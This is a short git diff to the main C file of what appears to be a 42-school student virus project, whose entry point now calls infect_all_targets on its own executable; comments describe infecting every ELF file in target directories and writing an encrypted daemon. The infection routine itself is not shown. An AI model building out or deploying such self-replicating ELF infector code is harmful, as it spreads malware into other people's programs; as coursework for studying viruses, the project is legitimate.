@@ -6,15 +6,18 @@
 /*   By: plamtenz <plamtenz@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2020/02/29 19:17:25 by plamtenz          #+#    #+#             */
-/*   Updated: 2020/02/29 19:20:04 by plamtenz         ###   ########.fr       */
+/*   Updated: 2020/02/29 20:00:25 by plamtenz         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "infection.h"
 
-int main()
+/*
+**      --> DEAMON (hexdump of his execution image will he ctypted, decripted and writed into a deamon)
+*/
+int main(int ac, char **argv)
 {
-    /* here execute the infection in every valid elf file into the targets dirs
-        the execution will be hexdump, alter that crypted
-        crypted text will be use for write the deamon */
+    (void)ac;
+    (void)infect_all_targets((char *)argv[0]);
+    return (0);
 }
